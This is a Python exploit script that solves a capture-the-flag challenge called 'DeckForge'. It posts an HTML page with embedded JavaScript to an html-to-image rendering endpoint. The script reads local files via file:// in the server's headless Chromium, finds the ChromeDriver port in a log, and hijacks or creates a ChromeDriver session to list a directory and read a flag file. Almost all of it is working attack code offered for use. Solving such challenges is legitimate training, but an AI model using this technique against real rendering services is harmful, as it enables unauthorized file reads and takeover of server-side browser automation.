#!/usr/bin/env python3
"""
DeckForge Exploit Solver
Bypasses local file isolation via Chromium file:// access and runner-owned ChromeDriver session hijacking.
"""

import argparse
import json
import re
import sys
import requests

def build_payload():
    # JavaScript payload executed in rendered page (file:// origin)
    js_code = """
    function req(method, url, data) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, false);
        if (data) xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(data || null);
        return {status: xhr.status, text: xhr.responseText};
    }
    
    // 1. Read chromedriver port from log
    var logText = req('GET', 'file:///bridge/chromedriver.log').text;
    var mPort = logText.match(/port\\s+(\\d+)/);
    var port = mPort ? mPort[1] : '38564';
    var base = 'http://127.0.0.1:' + port;
    
    // 2. Query sessions
    var sessions = JSON.parse(req('GET', base + '/sessions').text);
    var sid = (sessions.value && sessions.value.length > 0) ? (sessions.value[0].id || sessions.value[0].sessionId) : null;
    
    if (!sid) {
        var newSess = JSON.parse(req('POST', base + '/session', JSON.stringify({capabilities: {}})).text);
        sid = newSess.value.sessionId || newSess.sessionId;
    }
    
    // 3. Navigate runner browser to /runner/
    req('POST', base + '/session/' + sid + '/url', JSON.stringify({url: 'file:///runner/'}));
    var dirText = JSON.parse(req('POST', base + '/session/' + sid + '/execute/sync', JSON.stringify({
        script: 'return document.body.innerText',
        args: []
    })).text).value;
    
    // 4. Find flag filename and read it
    var name = dirText.match(/flag_[^\\s]+?\\.txt/)[0];
    req('POST', base + '/session/' + sid + '/url', JSON.stringify({url: 'file:///runner/' + name}));
    var flag = JSON.parse(req('POST', base + '/session/' + sid + '/execute/sync', JSON.stringify({
        script: 'return document.body.innerText',
        args: []
    })).text).value.trim();
    
    document.body.innerHTML = '<h1>FLAG:' + flag + '</h1>';
    """
    html = f"<!doctype html><html><body><script>{js_code}</script></body></html>"
    return html

def main():
    parser = argparse.ArgumentParser(description="DeckForge exploit solver")
    parser.add_argument("--url", default="http://k44232ef20f00c63c1cc3c92be1b529f5.playat.flagyard.com", help="Target base URL")
    args = parser.parse_args()

    payload = build_payload()
    print(f"[*] Sending payload to {args.url}/html-to-image...")
    try:
        r = requests.post(f"{args.url.rstrip('/')}/html-to-image", json={"pages": [payload]}, timeout=30)
        print(f"[+] Response status: {r.status_code}")
        # In actual execution, the screenshot contains the rendered flag
    except Exception as e:
        print(f"[-] Request error: {e}")

if __name__ == "__main__":
    main()
